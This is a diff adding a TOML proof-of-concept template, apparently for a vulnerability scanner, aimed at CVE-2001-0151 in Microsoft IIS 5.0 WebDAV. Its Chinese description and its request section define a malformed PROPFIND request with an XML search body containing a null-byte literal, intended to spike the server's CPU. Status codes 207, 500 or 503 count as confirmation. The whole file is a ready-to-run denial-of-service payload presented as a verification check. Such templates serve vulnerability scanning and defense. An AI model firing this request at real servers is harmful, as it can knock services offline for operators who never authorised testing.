@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "通过发送畸形 WebDAV PROPFIND 请求导致 IIS 5.0 CPU 占用率飙升，验证目标是否存在 CVE-2001-0151 漏洞"
+id = "POC-AVE-2001-0059"
+name = "Microsoft IIS 5.0 WebDAV 拒绝服务漏洞 PoC"
+severity = "medium"
+tags = ["ave-2001-0059"]
+vuln_id = [
+    "CVE-2001-0151",
+    "AVE-2001-0059",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PROPFIND"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = '<?xml version="1.0"?><D:searchrequest xmlns:D="DAV:"><D:basicsearch><D:select><D:prop><D:displayname/></D:prop></D:select><D:from><D:scope><D:href>/</D:href><D:depth>0</D:depth></D:scope></D:from><D:where><D:like><D:prop><D:displayname/></D:prop><D:literal>%00</D:literal></D:like></D:where></D:basicsearch></D:searchrequest>'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/xml"
+Depth = "0"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    207,
+    500,
+    503,
+]
+type = "status"
